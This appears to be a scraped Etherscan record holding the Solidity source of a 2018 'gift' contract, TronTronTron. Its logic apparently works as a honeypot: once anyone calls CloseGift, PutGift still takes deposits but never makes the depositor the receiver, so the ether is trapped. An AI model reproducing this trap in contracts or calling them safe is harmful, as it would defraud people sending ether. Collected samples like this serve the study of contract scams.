//token_name	
//token_url	https://etherscan.io//address/0xcb71b51d9159a49050d56516737b4b497e98bb99#code
//spider_time	2018/07/08 11:19:56
//token_Transactions	7 txns
//token_price	

pragma solidity ^0.4.22;

contract TronTronTron
{
    address  sender;
    address  receiver;
    uint  unlockTime;
    bool  closed = false;
    
 
    function PutGift(address _receiver) public payable {
        if( (!closed&&(msg.value >0.10 ether)) || sender==0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime = now;
        }
    }
    
    function SetGiftTime(uint _unixTime) public {
        if(msg.sender==sender) {
            unlockTime = _unixTime;
        }
    }
    
    function GetGift() public payable {
        if(receiver==msg.sender&&now>unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function CloseGift() public {
        if (receiver!=0x0) {
           closed=true;
        }
    }
    
    function() public payable{}
}